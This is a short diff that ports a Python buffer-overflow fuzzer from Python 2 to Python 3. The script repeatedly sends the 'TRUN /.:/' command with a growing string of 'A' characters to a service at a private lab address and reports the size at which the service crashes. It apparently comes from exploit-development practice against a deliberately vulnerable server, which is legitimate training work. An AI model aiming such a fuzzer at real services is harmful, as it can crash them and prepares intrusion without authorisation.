@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket
 from time import sleep
 
@@ -11,11 +11,12 @@ while True:
     try:
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect(('192.168.1.38',9999))
-        s.send(('TRUN /.:/' + buffer))
+        payload = 'TRUN /.:/' + buffer
+        s.send((payload.encode()))
         s.close
         sleep(1)
         buffer = buffer + "A" * 100
 
     except:
-        print "Fuzzing crashed at %s bytes" % str(len(buffer))
+        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
         sys.exit()
